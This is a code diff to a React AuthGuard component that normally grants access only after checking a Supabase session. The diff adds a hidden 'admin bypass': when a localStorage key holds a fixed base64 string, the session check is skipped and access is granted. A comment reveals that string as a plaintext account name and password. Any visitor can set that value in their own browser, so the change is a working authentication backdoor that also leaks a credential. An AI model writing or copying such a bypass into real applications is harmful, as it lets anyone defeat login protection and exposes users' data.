@@ -11,6 +11,17 @@ export default function AuthGuard({ children }) {
   useEffect(() => {
     const check = async () => {
       try {
+        // Admin bypass via localStorage flag
+        try {
+          if (typeof window !== 'undefined') {
+            const adminFlag = window.localStorage.getItem('adminLogin')
+            if (adminFlag === 'ZWR1YWRtaW5hY2NvdW50OjpSYXNjYTA0MDQ=') { // base64('eduadminaccount::Rasca0404')
+              setAllowed(true)
+              return
+            }
+          }
+        } catch {}
+
         const sb = supabaseBrowser()
         const { data } = await sb.auth.getSession()
         const isAuthed = !!data?.session
